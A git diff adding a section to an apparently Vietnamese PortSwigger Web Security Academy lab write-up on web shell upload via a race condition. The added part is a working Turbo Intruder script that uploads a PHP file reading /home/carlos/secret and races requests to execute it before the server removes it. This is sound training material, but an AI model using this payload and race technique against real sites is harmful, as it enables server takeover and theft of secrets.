@@ -94,3 +94,57 @@ Sau khi upload, truy cập `/files.avatars/naruto.php`, kết quả trả về n
 ![image](https://user-images.githubusercontent.com/103978452/203678976-af5de655-ed73-404e-a818-fb4515bea3ca.png)
 
 # 6. Web shell upload via race condition
+
+![image](https://user-images.githubusercontent.com/103978452/203904330-baaa8f18-b26b-48c4-b2f7-af3e92df0bbc.png)
+
+```
+# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/blob/master/resources/examples/default.py
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=10
+                           )
+
+    request1 = ""\
+    "POST /my-account/avatar HTTP/1.1\r\n"\
+    "Host: 0a38005f043e0b4fc00810a800d10038.web-security-academy.net\r\n"\
+    "Cookie: session=ySDNtxlS5Wf6y787ddzTzA37th5v6ZJa\r\n"\
+    "Content-Length: 470\r\n"\
+    "Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
+    "Connection: close\r\n"\
+    "\r\n"\
+    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
+    "Content-Disposition: form-data; name=\"avatar\"; filename=\"payload.php\"\r\n"\
+    "Content-Type: application/x-php\r\n"\
+    "\r\n"\
+    "<?php\r\n"\
+    "echo file_get_contents('/home/carlos/secret');\r\n"\
+    "?>\r\n"\
+    "\r\n"\
+    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
+    "Content-Disposition: form-data; name=\"user\"\r\n"\
+    "\r\n"\
+    "wiener\r\n"\
+    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG\r\n"\
+    "Content-Disposition: form-data; name=\"csrf\"\r\n"\
+    "\r\n"\
+    "QqXQoJAoGQxRfzIRVavqp4OP9zsCom7V\r\n"\
+    "------WebKitFormBoundaryCsL5cCjpW6YxOEmG--\r\n\r\n\r"
+
+    request2 = ""\
+    "GET /files/avatars/payload.php HTTP/1.1\r\n"\
+    "Host: 0a38005f043e0b4fc00810a800d10038.web-security-academy.net\r\n"\
+    "Cookie: session=ySDNtxlS5Wf6y787ddzTzA37th5v6ZJa\r\n"\
+    "Connection: close\r\n\r\n"
+
+    engine.queue(request1, gate='race1')
+    for x in range(5):
+        engine.queue(request2, gate='race2')
+
+    engine.openGate('race1')
+    engine.openGate('race2')
+    engine.complete(timeout=60)
+
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
